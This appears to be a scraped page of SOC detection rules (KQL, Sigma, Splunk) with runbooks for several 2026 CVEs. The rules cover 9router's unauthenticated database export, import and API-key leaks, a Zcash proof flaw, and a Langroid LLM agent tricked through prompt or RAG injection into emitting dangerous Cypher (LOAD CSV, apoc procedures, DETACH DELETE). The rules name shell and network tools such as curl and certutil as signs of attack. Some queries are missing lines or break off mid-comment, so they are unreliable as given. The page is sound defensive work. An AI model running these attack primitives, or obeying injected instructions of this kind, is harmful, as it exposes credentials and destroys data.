9router full database export via GET /api/settings/database (large 200 response) — CVE-2026-55500 AIActions on Objectives High
Hunts a successful GET to 9router's /api/settings/database that returns an oversized (>1MB) 200 response — the signature of a full database dump containing all plaintext API keys, OAuth tokens and OIDC client secrets. Fires on the export half of CVE-2026-55500 where the ALWAYS_PROTECTED middleware is the only (insufficient) guard. Rationale: Uses the article's exact endpoint (/api/settings/database), method (GET) and the operational fact that export returns the entire DB (apiKeys.key plaintext, providerConnections OAuth tokens, OIDC secrets) — a full dump is inherently a large 200, so bytes_out>1MB is the high-fidelity discriminator vs normal small settings reads. Corroborated by the GitLab advisory (CVSS 9.9) and TheHackerWire write-up. Defender/Falcon/CloudTrail empty: no server-side HTTP path telemetry on those platforms. Cross-checked against: • https://advisories.gitlab.com/npm/9router/CVE-2026-55500/ • https://www.thehackerwire.com/9router-unauthenticated-database-export-import/ • https://github.com/advisories/GHSA-qvfm-67h2-2qfx
ATT&CKT1190 T1552.001 T1528
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate admin taking a genuine settings/database backup from the 9router UI
  • Scheduled config-backup automation polling the export endpoint on a persistent session
  • A 9router instance with an unusually large legitimate apiKeys/providerConnections table producing >1MB even for routine reads
  • Migration tooling exporting the DB during an authorized version upgrade to 0.4.80
Suppression filter
// Exclude known backup-automation egress IPs that legitimately export config:
| where cIP !in ("10.20.0.15", "10.20.0.16")   // replace with your backup-job source IPs
Response runbook
1) TRIAGE: Identify cIP/src and whether it is an admin workstation or external/unexpected host; confirm 9router version (<0.4.80 = vulnerable) and whether the request carried a valid session. Note the response size — >1MB strongly implies a complete dump. 2) CONTAIN: Treat every stored secret as disclosed — rotate ALL provider API keys, OAuth tokens and OIDC client secrets held by 9router; block the source IP at the proxy; upgrade to >=0.4.80. 3) HUNT: Pivot on the src for a subsequent POST /api/settings/database (import/overwrite), for reuse of the stolen keys against upstream provider APIs (usage/billing spikes), and for scanning of other 9router hosts.
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem =~ "/api/settings/database"
| where csMethod =~ "GET"
| where scStatus == 200
| where scBytes > 1048576     // >1MB response body = full DB dump (all API keys / OAuth tokens in plaintext)
| project TimeGenerated, cIP, csMethod, csUriStem, scStatus, scBytes, csUserAgent, sSiteName, sPort
| sort by scBytes desc

9router malicious database import via POST /api/settings/database (mass overwrite) — CVE-2026-55500 AIActions on Objectives High
Detects any POST to 9router's /api/settings/database, which triggers importDb() — a transactional wipe-and-replace of every table (settings, providerConnections, apiKeys, combos, kv) including the admin password hash. Under CVE-2026-55500 this lets an attacker overwrite all credentials and set their own password; a POST to this endpoint is almost never legitimate. Rationale: Targets the import half of CVE-2026-55500: the article states POST /api/settings/database runs a DELETE-then-insert transaction across every table including the password hash. A POST (state-changing, body-carrying) to this specific path is inherently rare/high-signal, so the endpoint+method pair alone is high-fidelity. Corroborated by GitLab advisory and TheHackerWire. Cross-checked against: • https://advisories.gitlab.com/npm/9router/CVE-2026-55500/ • https://www.thehackerwire.com/9router-unauthenticated-database-export-import/ • https://github.com/advisories/GHSA-qvfm-67h2-2qfx
ATT&CKT1485 T1565.001 T1556
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorized admin restoring a database backup through the 9router UI during recovery
  • Migration/import step performed during an authorized upgrade to 0.4.80
  • Config-management tooling pushing a known-good settings blob on a persistent admin session
  • Automated test/staging seeding that imports a baseline DB
Suppression filter
// Exclude the change-management host that legitimately performs restores/imports:
| where cIP !in ("10.20.0.20")   // replace with your config-restore source IP
Response runbook
1) TRIAGE: Determine whether the POST maps to a scheduled restore/change ticket and whether src is an admin host; if unmatched, assume malicious overwrite. Check scStatus (200/204 = import succeeded). 2) CONTAIN: Restore the database from a known-good pre-incident backup, force-reset the admin password (attacker may have set their own hash), rotate all provider keys/tokens, block the source IP, upgrade to >=0.4.80. 3) HUNT: Correlate with a preceding GET export from the same src (export-then-overwrite chain), review admin logins that succeeded after the import time (attacker-set password), and check downstream services for disruption from the wiped/replaced config.
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem =~ "/api/settings/database"
| where csMethod =~ "POST"     // POST = importDb() full wipe-and-replace of settings/apiKeys/password hash
| project TimeGenerated, cIP, csMethod, csUriStem, scStatus, csBytes, csUserAgent, sSiteName, sPort
| sort by TimeGenerated desc

9router /api/settings/database auth denied then allowed — ALWAYS_PROTECTED bypass — CVE-2026-55500 AIExploitation Medium
Correlates 401/403 followed by a 200 from the same source against /api/settings/database, the pattern of an attacker probing the ALWAYS_PROTECTED (JWT/CLI-token) guard and then succeeding — via a forged/stolen token or default-password-derived JWT. Surfaces middleware-bypass and token-abuse activity that a single-event rule would miss. Rationale: Grounded in the article's core claim that /api/settings/database is guarded only by ALWAYS_PROTECTED (JWT/CLI token). A denied-then-allowed sequence from one source is the observable signature of forging/brute-guessing that token (default password '123456' yields a valid JWT) — a correlation no single event captures. Sigma empty (multi-status correlation); endpoint platforms empty (web-tier only). Cross-checked against: • https://advisories.gitlab.com/npm/9router/CVE-2026-55500/ • https://github.com/advisories/GHSA-qvfm-67h2-2qfx
ATT&CKT1556 T1190
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Admin whose session token expired (401) then re-authenticated and legitimately accessed the endpoint (200)
  • Shared NAT/proxy egress where one user's denied request and another's successful request share a source IP
  • Browser retry after a transient auth hiccup on a valid session
  • Monitoring probe that intermittently sends stale credentials before a valid check
Suppression filter
// Suppress noisy shared-egress proxies where denied/allowed legitimately mix per source:
| where cIP !in ("10.10.0.1")   // replace with your outbound NAT/proxy IPs
Response runbook
1) TRIAGE: Pull the ordered request timeline for cIP; inspect the auth token/cookie on the successful 200 and whether it corresponds to a real admin login. Confirm 9router version and whether the default password '123456' or JWT default secret is in play. 2) CONTAIN: Force a strong admin password + JWT secret and restart 9router (invalidates default-derived tokens), block the source IP, rotate all stored secrets. 3) HUNT: Follow the src into UC1 (large GET export) and UC2 (POST import), and check for the same denied-then-allowed pattern against other protected endpoints (/api/settings, password-change).
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem =~ "/api/settings/database"
| where scStatus in (200, 401, 403)
| summarize denied = countif(scStatus in (401,403)),
            success = countif(scStatus == 200),
            firstDenied = minif(TimeGenerated, scStatus in (401,403)),
            firstSuccess = minif(TimeGenerated, scStatus == 200)
          by cIP, sSiteName
| where denied > 0 and success > 0 and firstSuccess > firstDenied   // probed the guard, then got in
| project cIP, sSiteName, denied, success, firstDenied, firstSuccess
| sort by success desc

9router /api/settings/database endpoint enumeration / scanning — CVE-2026-55500 recon AIReconnaissance Medium
Flags a single source making a burst of requests (>5 in an hour) to /api/settings/database, or hitting the endpoint across many distinct hosts — the pre-exploitation reconnaissance for CVE-2026-55500 where attackers probe for exposed 9router instances (default port 20128) before attempting export/import. Rationale: The article establishes /api/settings/database (on 9router's default :20128) as the attack surface; opportunistic actors enumerate it before exploiting. A per-source burst (>5/hr) or fan-out across many hosts to this single sensitive path is a clean recon signal that precedes the export/import UCs. Threshold-based, so Sigma is omitted; web-tier only, so endpoint/AWS platforms empty. Cross-checked against: • https://advisories.gitlab.com/npm/9router/CVE-2026-55500/ • https://www.cisa.gov/news-events/bulletins/sb26-187

Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Authorized internal vulnerability scanner (Nessus/Nuclei/Qualys) sweeping for CVE-2026-55500 exposure
  • Uptime/health-check monitoring repeatedly polling the settings endpoint

Suppression filter
// Exclude sanctioned vulnerability-scanner egress IPs:
| where cIP !in ("10.30.0.5", "10.30.0.6")   // replace with your authorized scanner IPs
Response runbook
1) TRIAGE: Determine if the src is a sanctioned scanner (compare against your scanner IP allowlist) or external/unknown; review the status-code mix (repeated 401/403/404 then a 200 = successful discovery of a vulnerable host). 2) CONTAIN: If unsanctioned, block the source IP at the perimeter/WAF and ensure /api/settings/database is not internet-exposed; upgrade affected instances to >=0.4.80. 3) HUNT: Escalate any src that transitions from scanning to a 200 export (UC1) or a POST import (UC2); check whether other internet-facing 9router instances (port 20128) received the same probing source.

| where TimeGenerated > ago(24h)
| where csUriStem =~ "/api/settings/database"

            methods = make_set(csMethod),
            statuses = make_set(scStatus),
            agents = make_set(csUserAgent)
          by cIP, bin(TimeGenerated, 1h)
| where request_count > 5 or targets > 3   // >5 hits/hr to this endpoint OR spraying >3 sites = enumeration
| sort by request_count desc

// TVM tables are daily snapshots — pin a 1-day window so the engine

DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-55500")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId

OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Unpatched Zcash node exposed to CVE-2026-54496 Orchard soundness flaw (TVM) AIExploitation High
Flags managed devices whose vulnerability inventory reports CVE-2026-54496 (the halo2_gadgets variable-base scalar-mult missing-copy-constraint soundness bug enabling Orchard double-spend/theft). This is the only reliably detectable surface: the exploit itself is undetectable (valid ZK proofs, indistinguishable nullifiers), so defence is confirming every Zcash node has upgraded to the NU6.2-fixed versions. Rationale: Uses the exact CVE id (CVE-2026-54496) from the advisory against the Defender/MDVM vulnerability feed. The article's affected set (zebrad <5.0.0, zcashd <6.20.0, halo2_gadgets <0.5.0, orchard <0.14.0, zcash_primitives <0.28.0) is the ground truth; a TVM hit means the node is still exploitable. Cross-checked against: • https://github.com/advisories/GHSA-ww9q-8r59-xv46 • https://zfnd.org/zebra-4-5-3-and-5-0-0-emergency-soft-fork-and-nu6-2-activation/ • https://blocksec.com/blog/web3-security-zcash-orchard-soundness-bug-analysis
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Node already upgraded but TVM inventory not yet refreshed (stale scan) still shows old version for a few hours
  • A pinned dependency scanner reports the vulnerable halo2_gadgets crate embedded in an unrelated Rust binary that never touches Orchard consensus
  • Developer workstation with a checked-out but non-running copy of an old zebrad build
  • Test/regression node intentionally kept on the pre-NU6.2 circuit for research (InsecurePreNu6_2 path)
  • Vendored/static copy of the crate inside a container image that is not the live validator
Response runbook
1) Triage: confirm the flagged device is an actual live Zcash/Zebra node (check DeviceName/role and whether zebrad/zcashd is running) vs. a dormant dev checkout; note the reported SoftwareName/SoftwareVersion. 2) Contain: prioritise upgrade to the NU6.2-fixed builds (zebrad >=5.0.0 or the 4.5.3 interim soft-fork release, zcashd >=6.20.0); if the node cannot be upgraded immediately, keep Orchard actions disabled per the coordinated mitigation. 3) Hunt: enumerate every other host in the estate importing the vulnerable crates (halo2_gadgets/orchard/zcash_primitives) or running the daemons, and verify wallet-linked software wallets tied to hardware-wallet keys weren't compromised (theft vector requires knowing note plaintext/ivk).

| project Timestamp, DeviceId, DeviceName, OSPlatform, OSVersion, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate

| sort by TimeGenerated desc
Zcash node daemon (zebrad/zcashd) or halo2_gadgets crate at pre-NU6.2 version AIExploitation Medium
Inventory/version hunt that complements the CVE feed, which often lags for Rust crates and blockchain node software. Surfaces hosts running zebrad/zcashd below the NU6.2-fixed builds, or carrying vulnerable halo2_gadgets/orchard/zcash_primitives crate versions, so the SOC can confirm patch status even before MDVM ingests CVE-2026-54496. Rationale: Grounds directly in the article's 'Affected versions' block (zebrad <5.0.0, zcashd <6.20.0, halo2_gadgets <0.5.0, orchard <0.14.0, zcash_primitives <0.28.0). The process/Sysmon/Falcon variants surface which hosts actually run the node so an analyst can pivot to check version, covering the case where the TVM CVE feed hasn't yet ingested a brand-new Rust-crate CVE. Cross-checked against: • https://github.com/advisories/GHSA-ww9q-8r59-xv46 • https://zfnd.org/zebra-4-5-3-and-5-0-0-emergency-soft-fork-and-nu6-2-activation/
ATT&CKT1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Fully patched node (zebrad >=5.0.0 / zcashd >=6.20.0) surfaced only by the process-execution query, which cannot read version
  • Non-Windows validator where the Sysmon/Datadog Windows path clauses do not apply (use the Linux '/zebrad' Sigma selection or DeviceTvmSoftwareInventory instead)
  • Vendored copy of halo2_gadgets inside an unrelated Rust project that never participates in Orchard consensus
  • Short-lived CI build of an old zebrad tag during regression testing
  • Research node deliberately pinned to the InsecurePreNu6_2 verifying key
Response runbook
1) Triage: for process-only hits, retrieve the actual daemon version (zebrad --version / package metadata) since the process event has no version field; for inventory hits the version is already in the row. 2) Contain: schedule/enforce upgrade to zebrad >=5.0.0 (or the 4.5.3 interim soft-fork release) and zcashd >=6.20.0; leave Orchard actions disabled on any node that cannot be upgraded. 3) Hunt: expand the crate-name search across all build/dev hosts and container images, and validate that any software wallet linked to hardware-wallet spending keys was not compromised (the theft vector needs the note plaintext/ivk).

Neo4j JVM spawning OS shell/LOLBin (APOC/dbms Cypher-injection RCE ceiling, CVE-2026-55615) AIExploitation High
Hunts the config-conditional RCE ceiling of the Langroid Neo4jChatAgent Cypher-injection flaw: when APOC/dbms.security procedures are enabled, attacker-steered Cypher (e.g. apoc.cypher.runFile, dbms.* admin procedures) executes OS commands, causing the Neo4j java.exe process to spawn a shell/LOLBin child. Article-specific because it keys on the Neo4j JVM as parent, not a generic office->script chain. Rationale: Uses the article's stated RCE ceiling (APOC/dbms procedures granting OS-command access) reified as the only host-observable artifact: the Neo4j JVM (java.exe with 'neo4j' in cmdline) parenting a shell/LOLBin. Parent-JVM+shell-child is rare and high-fidelity. Cross-checked Neo4j APOC security guidelines and Varonis Neo4jection for the OS-exec surface. Cross-checked against: • https://advisories.gitlab.com/pypi/langroid/CVE-2026-55615/ • https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits • https://neo4j.com/docs/apoc/current/security-guidelines/
ATT&CKT1059.003 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • neo4j-admin backup/restore or dump/load jobs that legitimately shell out (excluded via neo4j-admin filter)
  • APOC-based ETL pipelines that intentionally call apoc.systemexec for approved batch jobs
  • DevOps runbooks invoking cypher-shell wrappers that spawn cmd/powershell for orchestration
  • Container healthcheck scripts where the Neo4j entrypoint (java) execs sh for readiness probes
  • Monitoring agents attached to the JVM that periodically spawn certutil/curl for self-update
Suppression filter
| where InitiatingProcessCommandLine !has_any ("neo4j-admin","cypher-shell","backup","restore")
Response runbook
1) Triage: pull the child ProcessCommandLine and the parent InitiatingProcessCommandLine; decode any base64/curl target. Confirm the parent is a production Neo4j JVM and check whether dbms.security.procedures.unrestricted / APOC is enabled on that server. 2) Contain: isolate the host, kill the child process tree, and revoke the Neo4j role's APOC/dbms privileges (drop to a least-privilege read role); block outbound from the Neo4j host. 3) Hunt: review Neo4j query.log for the preceding Cypher (apoc.*/dbms.*/CALL) and the Langroid app logs for the injected prompt/RAG source; verify langroid is upgraded to >=0.65.5.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "java.exe"
| where InitiatingProcessCommandLine has "neo4j"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","bash","sh","bash.exe","wscript.exe","cscript.exe","mshta.exe","curl.exe","certutil.exe","bitsadmin.exe","rundll32.exe","regsvr32.exe")
| where AccountName !endswith "$"
| where InitiatingProcessCommandLine !has "neo4j-admin"
| project Timestamp, DeviceName, AccountName, InitiatingProcessCommandLine, ChildProcess=FileName, ChildCmd=ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where ParentProcessName endswith "java.exe"
| where NewProcessName has_any ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","curl.exe","certutil.exe","bitsadmin.exe","rundll32.exe","regsvr32.exe")
| where CommandLine !has "neo4j-admin"
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

Neo4j process outbound egress to public IP (LOAD CSV / apoc.load.* SSRF, CVE-2026-55615) AICommand & Control Medium
Hunts the non-contingent floor primitive of CVE-2026-55615: the built-in LOAD CSV remote-fetch and (when APOC enabled) apoc.load.* SSRF, where attacker-steered Cypher makes the Neo4j JVM fetch attacker-chosen URLs. Detects the Neo4j java process making outbound connections to public IPs, which for a database server is abnormal. Rationale: Grounded in the article's floor claim ('built-in LOAD CSV remote-fetch (SSRF) primitive' plus apoc.load.* SSRF): a Neo4j database server making outbound public connections is the network-layer signature. Sentinel left empty because tying an outbound connection to the neo4j java process needs XDR/EDR network telemetry not present in native Sentinel tables (SecurityEvent/Syslog carry no per-process egress). Cross-checked against: • https://advisories.gitlab.com/pypi/langroid/CVE-2026-55615/ • https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits
ATT&CKT1105 T1190

  • apoc.load.json/apoc.load.jdbc calls against a sanctioned external API in normal operation
  • Neo4j Aura / cloud telemetry and crash-reporting beacons
  • JVM-embedded monitoring agent phoning home to a SaaS APM
Suppression filter
| where RemoteUrl !endswith "neo4j.com" and RemoteUrl !endswith "neo4j.io"
Response runbook
1) Triage: resolve the RemoteIP/RemoteUrl and check reputation; confirm whether the destination matches any sanctioned ETL/plugin-update endpoint for this Neo4j instance. 2) Contain: if unrecognized, block the destination at egress and quarantine the Neo4j host; snapshot the DB to preserve evidence. 3) Hunt: correlate to the same host's Neo4j query.log for 'LOAD CSV'/'apoc.load' statements and to Langroid app logs for the prompt/RAG content that generated them; validate least-privilege role and upgrade to langroid >=0.65.5.

Dangerous Cypher in Neo4j query log (apoc.*/dbms.*/LOAD CSV/DETACH DELETE) — CVE-2026-55615 AIActions on Objectives Medium
Hunts the injected-payload text directly in Neo4j query/audit logs: LLM-generated Cypher containing the exact dangerous primitives the article calls out — DETACH DELETE (graph destruction floor), LOAD CSV, and APOC/dbms/db admin procedures (RCE/SSRF/file ceiling). Targets the write/destroy and code-exec statements a validated agent should never emit. Rationale: Uses the article's verbatim dangerous-primitive list (DETACH DELETE, LOAD CSV, apoc.load/cypher.runFile/import/export, CALL dbms.*/db.*) — the exact statements the 0.65.5 validator now blocks — as query-log content matches. Defender/Falcon/CloudWatch left empty: Neo4j application query logs are not shipped to Defender XDR, FDR, or CloudTrail; only syslog-ingesting SIEMs (Sentinel/Datadog) or the raw Splunk index see them. Cross-checked against: • https://github.com/advisories/GHSA-2pq5-3q89-j7cc • https://neo4j.com/developer/kb/protecting-against-cypher-injection/

Expected false positives · estimated rate: medium — model-assessed, tune to your environment

Response runbook
1) Triage: extract the full Cypher statement and the connecting user/session; determine whether it originated from the Langroid agent's DB role vs. a human DBA. 2) Contain: if agent-originated and destructive (DETACH DELETE/apoc.export/dbms.*), suspend the agent's DB credential and restore graph from snapshot if data was deleted. 3) Hunt: pivot to Langroid app logs for the prompt/RAG document that produced the statement (indirect injection), and to host EDR for any java->shell child (see RCE UC); confirm allow_dangerous_operations is False and langroid >=0.65.5.

Recon scanning of 9router unauthenticated /api/* endpoints from single source AIReconnaissance Medium
Hunts a single client sweeping the article's named unauthenticated 9router API paths (/api/providers, /api/usage/stats, /api/usage/request-logs, /api/usage/request-details, /api/models, /api/version) within a short window — the discovery step before an attacker exploits the missing-auth CRUD and key-leak endpoints. Article-specific because the endpoint set is exactly the one enumerated in GHSA-vjc7-jrh9-9j86. Rationale: Uses the exact unauthenticated endpoint set enumerated in GHSA-vjc7-jrh9-9j86 (/api/providers, /api/usage/stats, /api/usage/request-logs, /api/usage/request-details, /api/models, /api/version); a single src hitting 6+ of them in 5 minutes is scanning, not a legit SPA which only pulls the specific ones it renders. Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431 • https://advisories.gitlab.com/npm/9router/GHSA-g6g7-pvmx-m74p/
ATT&CKT1595.002 T1046
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Authenticated admin loading the 9router dashboard which legitimately fans out to /api/providers + /api/models + /api/version on page load
  • Internal uptime/health monitor polling several /api/* endpoints
  • Security scanner (Nessus/Burp) run by the org's own AppSec team during authorized testing
  • CI smoke test hitting multiple API routes post-deploy
Suppression filter
| where SrcIpAddr !in ("10.0.0.0/8 internal-monitor-ranges")  // replace with your health-check / AppSec scanner source IPs once identified
Response runbook
1) Triage: pull all requests from the offending SrcIpAddr in the window; is it an internal admin/monitor IP or external/unknown? Check whether requests carried a session cookie/Authorization header (unauthenticated = no creds). 2) Contain: block the source IP at the WAF/reverse proxy and put /api/providers and /api/usage/* behind auth or a network ACL; confirm the 9router instance is upgraded to >=0.4.45. 3) Hunt: pivot the same src to the mutation and key-leak UCs below — look for follow-on POST/PUT/DELETE /api/providers and GET /api/usage/stats returning 200.

Unauthenticated 9router provider CRUD mutation (rogue-provider / key-swap / DoS) AIActions on Objectives High
Hunts POST/PUT/DELETE requests to /api/providers or /api/providers/:id — the missing-auth mutation path that lets any client inject an attacker-controlled provider (proxying prompts/keys), overwrite an existing provider's API key, or delete all providers for denial of service. Article-specific to the CRUD endpoints in GHSA-vjc7-jrh9-9j86 which require zero authentication. Rationale: POST/PUT/DELETE to /api/providers is a direct match for the missing-auth CRUD in the advisory; because the endpoint requires no auth, ANY mutation from an unexpected source is high-fidelity (inject rogue provider with attacker apiKey, swap sk-* key, or delete for DoS). Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431 • https://advisories.gitlab.com/npm/9router/GHSA-g6g7-pvmx-m74p/
ATT&CKT1565.001 T1098.003
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate admin adding/editing/removing a provider connection via the dashboard UI (which calls the same routes)
  • Automated provisioning/IaC script that seeds provider configs on deploy
  • Internal migration job re-writing provider entries during an upgrade to 0.4.45
Suppression filter
| where HttpMethod == "DELETE" or SrcIpAddr !in ("<known-admin-workstation-IPs>")  // start with DELETE (never a benign bulk op) then add admin-source allowlist
Response runbook
1) Triage: inspect the request body/UA and source IP — was there a preceding authenticated dashboard session from the same client, or is it a raw curl/unknown UA? DELETE with no prior admin login = malicious. Pull the created/modified provider's name and apiKey prefix from app logs. 2) Contain: revoke/rotate any provider API keys that could have been swapped or exfiltrated, remove attacker-injected provider entries, block the source, and gate /api/providers/* behind auth; upgrade to >=0.4.45. 3) Hunt: check /api/usage/stats reads (key leak) from the same src, and outbound traffic from the 9router host to any newly-added provider endpoint (prompt/response proxying).
ImWebSession
| where TimeGenerated > ago(1d)
| extend UrlPath = tostring(parse_url(Url).Path)
| where UrlPath startswith "/api/providers"
| where HttpMethod in ("POST","PUT","DELETE")
| extend Status = toint(HttpStatusCode)
| project TimeGenerated, SrcIpAddr, HttpHostName, HttpMethod, UrlPath, Status, HttpRequestBodyBytes, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

9router API-key leak via unauthenticated GET /api/usage/stats and /api/usage/request-logs AIActions on Objectives High
Hunts successful GET requests to /api/usage/stats (returns full plaintext sk- API keys, per-account cost data) and /api/usage/request-logs (all users' request history incl. emails) — the unauthenticated credential-exposure endpoints in the advisory. Any 200 here means secrets were served without auth. Rationale: /api/usage/stats returning 200 literally serves plaintext sk- keys and per-key cost data per the advisory, and /api/usage/request-logs serves all users' history with emails — both are named unauthenticated endpoints, so a successful GET is a confirmed secret disclosure, not just an attempt. Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431
ATT&CKT1528 T1552.001
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authenticated admin opening the 9router usage/billing dashboard which fetches these endpoints
  • Internal billing/reporting exporter scraping usage stats on a schedule
  • Monitoring probe validating the endpoint is up
Suppression filter
| where SrcIpAddr !in ("<admin-and-billing-exporter-IPs>")
Response runbook
1) Triage: identify SrcIpAddr and whether the request was authenticated; if external/unknown, treat every sk- key and OAuth token stored in that 9router instance as compromised. Correlate response byte-size — larger bodies = full key dump. 2) Contain: immediately rotate ALL provider API keys (OpenAI sk-, GitHub Copilot OAuth tokens, Cloudflare account creds) referenced by the instance, block the source, gate /api/usage/* behind auth, upgrade to >=0.4.45. 3) Hunt: search external AI-provider billing/usage for anomalous calls using the leaked keys; check for concurrent /api/usage/request-details enumeration (conversation exfil) from the same src.
ImWebSession
| where TimeGenerated > ago(1d)
| extend UrlPath = tostring(parse_url(Url).Path)
| where UrlPath in ("/api/usage/stats","/api/usage/request-logs")
| where HttpMethod == "GET"
| extend Status = toint(HttpStatusCode)
| where Status == 200
| project TimeGenerated, SrcIpAddr, HttpHostName, UrlPath, Status, HttpResponseBodyBytes, HttpRequestHeaderUserAgent
| order by TimeGenerated desc
title: Unauthenticated 9router API Key / Usage Data Leak Access
id: c41a8e60-9f2b-4d77-b3e1-2a6c7d90f4b8
description: Detects successful GET to 9router /api/usage/stats or /api/usage/request-logs, which return full plaintext sk- API keys and all users' request history without authentication (GHSA-vjc7-jrh9-9j86).
references:
  - https://github.com/advisories/GHSA-vjc7-jrh9-9j86
  - https://github.com/decolua/9router/issues/431
author: SOC Detection Engineering
date: 2026/07/07
tags:
  - attack.credential_access
  - attack.t1528
  - attack.t1552.001
logsource:
  category: webserver
detection:
  selection:
    cs-method: 'GET'
    cs-uri-stem:
      - '/api/usage/stats'
      - '/api/usage/request-logs'
    sc-status: 200
  condition: selection
falsepositives:
  - Authenticated admin viewing the usage dashboard
level: high
WEB
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count, values(Web.http_user_agent) as user_agents, sum(Web.bytes_out) as bytes_out from datamodel=Web where Web.uri_path IN ("/api/usage/stats","/api/usage/request-logs") AND Web.http_method="GET" AND Web.status=200 by Web.src, Web.dest, Web.uri_path, _time span=1m
| `drop_dm_object_name(Web)`
| sort - _time
| tstats summariesonly=false count, values(Web.http_user_agent) as user_agents, sum(Web.bytes_out) as bytes_out from datamodel=Web where Web.uri_path IN ("/api/usage/stats","/api/usage/request-logs") AND Web.http_method="GET" AND Web.status=200 by Web.src, Web.dest, Web.uri_path, _time span=1m
| `drop_dm_object_name(Web)`
| sort - _time
Bulk enumeration of 9router /api/usage/request-details (conversation-history exfiltration) AIActions on Objectives Medium
Hunts a single source sequentially pulling many distinct /api/usage/request-details/:id records — each returns another user's full conversation (system prompts, user/assistant messages, tool calls, reasoning traces) with no auth. High distinct-UUID count or large cumulative response volume from one src indicates mass conversation exfiltration. Rationale: /api/usage/request-details/:id returns full cross-user conversation contents per the advisory; a single src pulling 25+ distinct request UUIDs (200 responses) in 30 minutes is enumeration/exfil of other users' sessions, distinguishable from a user reviewing their own handful of requests. Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431
ATT&CKT1530 T1213
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authenticated admin auditing usage by opening many request details in the dashboard
  • Internal data-export/backup job iterating request records
  • Analytics pipeline reading conversation records for QA
  • Load/soak test replaying many request-detail IDs
Suppression filter
| where SrcIpAddr !in ("<admin-and-export-job-IPs>")
Response runbook
1) Triage: confirm the source is unauthenticated/external and count distinct UUIDs + total bytes served — high both = full conversation-store dump. Sample which conversations were pulled (any containing embedded secrets in prompts?). 2) Contain: block the source, gate /api/usage/request-details behind auth, upgrade to >=0.4.45; notify data-owner/DPO as user prompt/response content (potentially PII/secrets) was disclosed. 3) Hunt: correlate the same src with /api/usage/stats (key leak) and /api/providers mutation; review any secrets/tokens that appeared inside leaked prompts and rotate them.
ImWebSession
| where TimeGenerated > ago(1d)
| extend UrlPath = tostring(parse_url(Url).Path)
| where UrlPath startswith "/api/usage/request-details/"
| where HttpMethod == "GET"
| extend Status = toint(HttpStatusCode)
| where Status == 200
| summarize DistinctDetails = dcount(UrlPath), TotalBytes = sum(HttpResponseBodyBytes), ReqCount = count() by SrcIpAddr, HttpHostName, bin(TimeGenerated, 30m)
| where DistinctDetails >= 25   // 25+ distinct conversation records from one src in 30m = mass exfil
| order by DistinctDetails desc
WEB
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count, dc(Web.uri_path) as distinct_details, sum(Web.bytes_out) as bytes_out, values(Web.http_user_agent) as user_agents from datamodel=Web where Web.uri_path="/api/usage/request-details/*" AND Web.http_method="GET" AND Web.status=200 by Web.src, Web.dest, _time span=30m
| `drop_dm_object_name(Web)`
| where distinct_details >= 25   // 25+ distinct conversation UUIDs pulled by one src in 30m = enumeration, not a user reviewing their own history
| sort - distinct_details
